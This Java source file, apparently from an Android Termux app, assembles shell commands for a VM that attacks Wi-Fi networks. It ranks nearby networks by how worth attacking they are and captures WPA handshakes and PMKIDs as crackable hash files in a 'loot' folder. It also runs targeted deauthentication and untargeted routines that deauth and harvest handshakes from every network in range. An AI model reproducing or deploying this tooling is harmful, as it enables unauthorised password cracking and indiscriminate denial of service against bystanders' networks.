package com.termux.app.rootless;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.text.TextUtils;

import java.util.regex.Pattern;

/**
 * The wireless quick actions offered in the drawer's VM section.
 *
 * Each action is a single guest shell command line, typed into the VM console session (which is
 * bridged to the guest's serial root shell). Deliberately no credentials, no SSH client and no
 * helper binary inside the guest: the console is already a root shell.
 *
 * Every action prints its results as a compact table whose FIRST column is the SSID, because
 * airodump-ng's own table is far too wide for a phone: the ESSID column ends up cut off, and the
 * BSSID (which the target field needs) is the only thing left visible. The table is built from
 * airodump's CSV, which stays in the guest, so nothing is parsed on the app side.
 *
 * Safety: the target BSSID is validated against a strict MAC pattern and the SSID is reduced to
 * shell-safe characters before either is interpolated into a command line, and the channel is an
 * int, so a target can never smuggle shell syntax into the guest.
 */
public final class RootlessActions {

    private static final String PREFS = "rootless_actions";
    private static final String KEY_BSSID = "target_bssid";
    private static final String KEY_CHANNEL = "target_channel";
    private static final String KEY_SSID = "target_ssid";
    public static final int DEFAULT_CHANNEL = 6;

    private static final Pattern BSSID_PATTERN = Pattern.compile("^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$");

    private static final String IFACE = "wlan0";

    /** Column header for the network table, matching {@link #ssidTable(String)}'s output. */
    private static final String TABLE_HEADER =
        "printf '\\n%-22.22s %-17s %-3s %-4s %s\\n' SSID BSSID CH PWR ENC";

    private RootlessActions() {}

    private static SharedPreferences prefs(Context c) {
        return c.getApplicationContext().getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    public static boolean isValidBssid(String bssid) {
        return !TextUtils.isEmpty(bssid) && BSSID_PATTERN.matcher(bssid.trim()).matches();
    }

    public static String getTargetBssid(Context c) {
        return prefs(c).getString(KEY_BSSID, "");
    }

    public static int getTargetChannel(Context c) {
        return prefs(c).getInt(KEY_CHANNEL, DEFAULT_CHANNEL);
    }

    public static String getTargetSsid(Context c) {
        return prefs(c).getString(KEY_SSID, "");
    }

    public static boolean hasTarget(Context c) {
        return isValidBssid(getTargetBssid(c));
    }

    public static void setTarget(Context c, String bssid, int channel, String ssid) {
        prefs(c).edit()
            .putString(KEY_BSSID, bssid.trim().toLowerCase())
            .putInt(KEY_CHANNEL, channel)
            .putString(KEY_SSID, ssid == null ? "" : ssid.trim())
            .apply();
    }

    /** Reduce a user-entered SSID to characters that cannot alter a shell command line. */
    private static String shellSafe(String text) {
        if (text == null) return "";
        return text.replaceAll("[^A-Za-z0-9 ._-]", "").trim();
    }

    /** What the target is, named the way the table names it: SSID first, BSSID in brackets. */
    public static String targetLabel(Context c) {
        String ssid = shellSafe(getTargetSsid(c));
        String bssid = getTargetBssid(c);
        int channel = getTargetChannel(c);
        if (TextUtils.isEmpty(bssid)) return "no target set";
        if (TextUtils.isEmpty(ssid)) return bssid + " (ch " + channel + ")";
        return ssid + " (" + bssid + ", ch " + channel + ")";
    }

    private static String banner(Context c) {
        return "echo '=== target: " + targetLabel(c) + " ==='; ";
    }

    /**
     * Mark the start of a run: {@code @@RUN <tool> <epoch seconds>}.
     *
     * The app reads these out of the console mirror log, so it can say what is holding the adapter
     * right now without ever polling the guest - and polling would be worse than useless here, since
     * anything typed while a capture tool is running is fed to that tool, not to the shell.
     */
    private static String run(String tool) {
        return "echo \"@@RUN " + tool + " $(date +%s)\"; ";
    }

    /** Mark the end of a run, so the app knows the adapter is free again. */
    private static String done(String tool) {
        return "echo '@@DONE " + tool + "'; ";
    }

    /**
     * Report how many hashes a capture produced: {@code @@HASH <kind> <count>}.
     *
     * Counted by lines in the hash file itself rather than by scraping a tool's summary text, so the
     * number cannot drift with a tool's wording.
     */
    private static String hashes(String kind, String hashFile) {
        return "echo \"@@HASH " + kind + " $(wc -l < " + hashFile + " 2>/dev/null || echo 0)\"; ";
    }

    /**
     * An SSID-first table of the networks in an airodump-ng CSV: {@code SSID BSSID CH PWR ENC},
     * strongest signal first, {@code <hidden>} for a suppressed SSID and {@code OPN} for an open AP.
     * Parsing stops at the blank line that ends the access-point section, so the station table
     * below it (whose first column is also a MAC) is not mistaken for networks.
     */
    private static String ssidTable(String csv) {
        return "awk -F', *' 'BEGIN{ap=0} /^[[:space:]]*$/{if(ap)exit; next} "
            + "$1 ~ /^([0-9A-Fa-f]{2}:){5}/ {"
            + "ap=1; essid=$14; gsub(/[^[:print:]]/,\"\",essid); gsub(/^ +/,\"\",essid); gsub(/ +$/,\"\",essid); "
            + "if(essid==\"\")essid=\"<hidden>\"; "
            + "priv=$6; if(priv==\"\")priv=\"OPN\"; "
            // The point of the table is which network is worth attacking, so the tier does the
            // talking: open/WEP/WPA-only comes out red, WPA2 amber, and WPA3 - which cannot be walked
            // through with a handshake - stays plain. A WPA3/WPA2 network counts as WPA3.
            + "col=31; if(priv ~ /WPA3/)col=0; else if(priv ~ /WPA2/)col=33; "
            // A real ESC byte rather than "\033" in the format: the guest's awk prints the backslash
            // form verbatim, which is how the first attempt at colouring produced visible "\033[33m"
            // text instead of colour.
            + "esc=sprintf(\"%c\",27); "
            + "printf \"%05d %s[%dm%-22.22s %-17s %-3s %-4s %s%s[0m\\n\","
            + " $9+1000, esc, col, essid, $1, $4, $9, priv, esc"
            + "}' " + csv + " 2>/dev/null | sort -k1,1 -nr | cut -d' ' -f2-";
    }

    /** Everything captured in the guest lives under here, one subtree per capture type. */
    private static final String LOOT = "/root/loot";

    /**
     * Open a run directory for a capture type: {@code /root/loot/<type>/<timestamp>}, with
     * {@code /root/loot/<type>/latest} left pointing at it, so the newest run always has one stable
     * path and older runs stay where they are.
     *
     * <p>The first run of any kind also files away what the old flat layout left loose in /root, so
     * the guest's home stops collecting captures. Sets {@code $D} for the rest of the command.</p>
     */
    private static String runDir(String type) {
        return "D=" + LOOT + "/" + type + "/$(date +%Y%m%d-%H%M%S); mkdir -p \"$D\"; "
            + "ln -sfn \"$D\" " + LOOT + "/" + type + "/latest; "
            + "mkdir -p " + LOOT + "/_legacy; "
            + "mv /root/*.csv /root/*.cap /root/*.hc22000 /root/*.pcapng "
            + LOOT + "/_legacy/ 2>/dev/null; ";
    }

    /** The same run-directory opening, for the target picker in the other class. */
    static String lootRunDir(String type) {
        return runDir(type);
    }

    /**
     * Run airodump-ng for a bounded time under its own pty.
     *
     * The pty matters: with no controlling terminal airodump writes 0-byte captures, which looks
     * exactly like a driver or adapter failure. Output goes to /dev/null because the caller prints
     * its own table - airodump's wide table is unreadable on a phone.
     */
    private static String airodump(String args, int seconds, String tag, String dir) {
        return "timeout -k 5 " + seconds + " script -qec \"airodump-ng " + args + " " + IFACE + "\" "
            + dir + "/" + tag + "-tty.log >/dev/null 2>&1; pkill -x airodump-ng 2>/dev/null; ";
    }

    /** Print the SSIDs that ended up in a capture file, framed for the app. */
    private static String ssidFromCapture(String capFile) {
        // The workfile goes to /tmp, not the home directory: it is scaffolding, not a result.
        return "hcxpcapngtool -E /tmp/essids.txt " + capFile + " >/dev/null 2>&1; "
            + "echo '--- SSIDs in this capture ---'; "
            + "sort -u /tmp/essids.txt 2>/dev/null | while read s; do echo \"@@SSID $s\"; done; "
            + "rm -f /tmp/essids.txt; ";
    }

    /** A short passive look at one channel, printed as an SSID-first table. */
    private static String channelTable(int channel, String dir) {
        return "echo '--- networks on channel " + channel + " (SSID first) ---'; "
            + airodump("-c " + channel + " -w " + dir + "/pre --write-interval 2", 20, "pre", dir)
            + TABLE_HEADER + "; " + ssidTable(dir + "/pre-01.csv") + "; ";
    }

    /**
     * Put the adapter into monitor mode on one channel.
     *
     * {@code iwconfig} and not the nl80211 setter: this out-of-tree RTL8812AU build ignores the
     * nl80211 channel call, which is also why the channel has to be re-applied after a type change.
     */
    private static String monitorPrefix(int channel) {
        return "ip link set " + IFACE + " down; "
            + "iw dev " + IFACE + " set type monitor; "
            + "ip link set " + IFACE + " up; sleep 1; "
            + "iwconfig " + IFACE + " channel " + channel + "; sleep 1; ";
    }

    /** Monitor mode with no fixed channel, so airodump-ng can hop the whole band itself. */
    private static String monitorAllBands() {
        return "ip link set " + IFACE + " down; "
            + "iw dev " + IFACE + " set type monitor; "
            + "ip link set " + IFACE + " up; sleep 1; ";
    }

    /**
     * Sweep every channel and keep an SSID-first table on screen, refreshed every 10 seconds while
     * the sweep runs, then printed once more as the final list.
     */
    public static String scanCommand() {
        // Unquoted $D: the run path has no spaces, and quoting it would nest quotes inside the
        // string that script -qec has to wrap.
        String d = "$D";
        String csv = d + "/scan-01.csv";
        return run("scan")
            + runDir("airodump")
            + monitorAllBands()
            + "echo '--- sweeping every channel for 100s ---'; "
            // Foreground, under timeout, through the same pty wrapper the channel tables use. The
            // earlier version backgrounded this job, and the shell's job control stopped it the
            // moment it touched the controlling tty (SIGTTIN) - the scan then reported a perfectly
            // empty table, which reads exactly like "there is nothing in range".
            + airodump("-w " + d + "/scan --write-interval 2 --output-format csv", 100, "scan", d)
            + "echo; echo '--- scan finished: all networks found ---'; "
            + TABLE_HEADER + "; " + ssidTable(csv)
            + "; " + done("scan");
    }

    /** Focused capture on the stored target, then check the result with hcxpcapngtool + aircrack. */
    public static String handshakeCommand(Context c) {
        String bssid = getTargetBssid(c);
        int channel = getTargetChannel(c);
        String d = "$D";
        return run("handshake")
            + runDir("handshakes")
            + banner(c)
            + monitorPrefix(channel)
            + channelTable(channel, d)
            + "echo '--- capturing the 4-way handshake on " + targetLabel(c) + " (up to 240s) ---'; "
            + "timeout -k 5 240 airodump-ng -c " + channel + " --bssid " + bssid + " -w " + d + "/hs " + IFACE + "; "
            + "pkill -x airodump-ng 2>/dev/null; "
            + "echo '--- validating capture ---'; "
            + "hcxpcapngtool -o " + d + "/hs.hc22000 " + d + "/hs-01.cap; "
            + "aircrack-ng " + d + "/hs-01.cap; ls -l " + d + "/hs.hc22000; "
            + ssidFromCapture(d + "/hs-01.cap")
            + hashes("handshake", d + "/hs.hc22000")
            + done("handshake");
    }

    /** PMKID hunt on the target's channel. */
    public static String pmkidCommand(Context c) {
        int channel = getTargetChannel(c);
        String d = "$D";
        return run("pmkid")
            + runDir("pmkid")
            + banner(c)
            + monitorPrefix(channel)
            + channelTable(channel, d)
            + "echo '--- PMKID hunt on " + targetLabel(c) + " (up to 240s) ---'; "
            // hcxdumptool >= 6 writes the dump with -w (not -o, which older guides show) and
            // --rds=1 keeps the newest PMKID/EAPOL at the top of its live display.
            + "timeout -k 5 240 hcxdumptool -i " + IFACE + " -w " + d + "/pmkid.pcapng --rds=1; "
            + "pkill -x hcxdumptool 2>/dev/null; "
            + "echo '--- extracting ---'; "
            + "hcxpcapngtool -o " + d + "/pmkid.hc22000 " + d + "/pmkid.pcapng; ls -l " + d + "/pmkid.hc22000; "
            + ssidFromCapture(d + "/pmkid.pcapng")
            + hashes("pmkid", d + "/pmkid.hc22000")
            + done("pmkid");
    }

    /** Continuous broadcast deauth against the target. PMF-capable APs will ignore it by design. */
    public static String deauthCommand(Context c) {
        String bssid = getTargetBssid(c);
        int channel = getTargetChannel(c);
        String d = "$D";
        return run("deauth")
            + runDir("deauth")
            + banner(c)
            + monitorPrefix(channel)
            + channelTable(channel, d)
            + "echo '--- deauthing " + targetLabel(c) + " for 120s ---'; "
            // aireplay-ng frames are not written anywhere, so there is nothing to derive an SSID
            // from here - the table above is what names the network.
            + "timeout -k 5 120 aireplay-ng --deauth 0 -a " + bssid + " " + IFACE + "; "
            + "echo '--- deauth window over ---'; "
            + done("deauth");
    }

    /** {@code BSSID channel} for every access point in an airodump-ng CSV. */
    private static String bssidChannelList(String csv) {
        return "awk -F', *' 'BEGIN{ap=0} /^[[:space:]]*$/{if(ap)exit; next} "
            + "$1 ~ /^([0-9A-Fa-f]{2}:){5}/ {ap=1; print $1, $4}' " + csv + " 2>/dev/null";
    }

    /**
     * Deauth every network in range. Deliberately needs no target: the networks are discovered
     * first, then each one is hit while the radio sits on that network's channel - one radio cannot
     * inject on two channels at once, so this walks the list instead of blasting in parallel.
     */
    public static String massDeauthCommand() {
        String d = "$D";
        return run("mass-deauth")
            + runDir("airodump")
            + "echo '=== mass deauth: every network in range ==='; "
            + monitorAllBands()
            + "echo '--- finding networks ---'; "
            + airodump("-w " + d + "/all --write-interval 2", 25, "all", d)
            + TABLE_HEADER + "; " + ssidTable(d + "/all-01.csv") + "; "
            + "echo '--- deauthing each of them in turn ---'; "
            + bssidChannelList(d + "/all-01.csv")
            + " | while read b ch; do echo \"  $b  ch $ch\"; "
            + "iwconfig " + IFACE + " channel $ch 2>/dev/null; sleep 1; "
            + "timeout -k 2 6 aireplay-ng --deauth 0 -a $b " + IFACE + " >/dev/null 2>&1; done; "
            + "echo '--- mass deauth window over ---'; "
            + done("mass-deauth");
    }

    /**
     * Capture handshakes from everything in range, again with no target: walk the channels and on
     * each one capture while deauthing the networks found there, so any client that reconnects
     * gives up its 4-way handshake. Ends by validating everything captured and naming the SSIDs.
     */
    public static String massHandshakeCommand() {
        String d = "$D";
        return run("mass-handshake")
            + runDir("handshakes")
            + "echo '=== mass handshake capture: everything in range ==='; "
            + monitorAllBands()
            + "for ch in 1 2 3 4 5 6 7 8 9 10 11 12 13; do "
            + "printf '\\033[2J\\033[H'; echo \"--- channel $ch: capturing, then deauthing what is there ---\"; "
            + "iwconfig " + IFACE + " channel $ch 2>/dev/null; sleep 1; "
            + "script -qec \"airodump-ng -c $ch -w " + d + "/mhs-$ch --write-interval 2 " + IFACE + "\" "
            + d + "/mhs-$ch.log >/dev/null 2>&1 & "
            + "sleep 8; "
            + TABLE_HEADER + "; " + ssidTable(d + "/mhs-$ch-01.csv") + "; "
            + bssidChannelList(d + "/mhs-$ch-01.csv")
            + " | head -4 | while read b _; do timeout -k 2 4 aireplay-ng --deauth 0 -a $b " + IFACE + " >/dev/null 2>&1; done; "
            + "sleep 2; pkill -x airodump-ng 2>/dev/null; "
            + "done; "
            + "echo '--- validating every capture ---'; "
            + "hcxpcapngtool -o " + d + "/mhs.hc22000 " + d + "/mhs-*-01.cap 2>&1 | tail -20; "
            + ssidFromCapture(d + "/mhs-*-01.cap")
            + hashes("handshake", d + "/mhs.hc22000")
            + done("mass-handshake");
    }

    /**
     * Bring the results up in a floating terminal so they can be watched while the phone is used for
     * something else. Returns false when Termux:Float is not installed, in which case the caller
     * falls back to the console session, which shows the same output.
     */
    public static boolean launchFloat(Context c) {
        if (c.getPackageManager().getLaunchIntentForPackage("com.termux.window") == null) return false;
        try {
            Intent i = new Intent(Intent.ACTION_MAIN);
            i.setClassName("com.termux.window", "com.termux.window.TermuxFloatActivity");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
